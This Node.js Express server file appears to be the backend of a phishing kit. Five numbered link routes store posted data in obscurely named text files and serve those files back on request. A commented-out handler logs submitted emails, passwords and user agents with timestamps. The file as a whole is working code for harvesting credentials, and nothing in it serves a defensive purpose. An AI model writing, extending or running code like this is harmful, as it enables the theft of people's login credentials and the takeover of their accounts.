const express = require('express')
const fs = require('fs')
const cors = require('cors')
const { PostController } = require('./PostController')

app = express()

app.use(cors())

app.use(express.json())


/////////////  Link - 01

app.get('/users/1', (req, res) => {
  res.sendFile(__dirname + '/kfiwefjk.txt')
})

app.post('/users/1', (req, res) => {
  PostController(req, res, "kfiwefjk.txt")
})

/////////////  Link - 02

app.get('/users/2', (req, res) => {
  res.sendFile(__dirname + '/oiefjwoi.txt')
})

app.post('/users/2', (req, res) => {
  PostController(req, res, "oiefjwoi.txt")
})

/////////////  Link - 03

app.get('/users/3', (req, res) => {
  res.sendFile(__dirname + '/poefwie.txt')
})

app.post('/users/3', (req, res) => {
  PostController(req, res, "poefwie.txt")
})

/////////////  Link - 04

app.get('/users/4', (req, res) => {
  res.sendFile(__dirname + '/iowiefjweiof.txt')
})

app.post('/users/4', (req, res) => {
  PostController(req, res, "iowiefjweiof.txt")
})

/////////////  Link - 05

app.get('/users/5', (req, res) => {
  res.sendFile(__dirname + '/iowivweoifj.txt')
})

app.post('/users/5', (req, res) => {
  PostController(req, res, "iowivweoifj.txt")
})



// app.post('/users', (req, res) => {
//   const { email, pass, userAgent } = req.body
//   fs.appendFile('lseif3472nweio.txt', `
//   email : ${email}
//   pass  : ${pass}
//   user  : ${userAgent}
//   date  : ${new Date().toLocaleTimeString()} - ${new Date().toLocaleDateString()} 
//   __________________________________________________________________________________________________________________________
//   `, (err) => {
//     if (err) {
//       console.log(err)
//       res.status(500).json({
//         message: "error occured"
//       })
//     } else {
//       res.status(200).json({
//         message: 'data appended'
//       })
//     }
//   })
// })



app.listen(4500, () => {
  console.log(`Your server is running at : http://localhost:4500`)
})


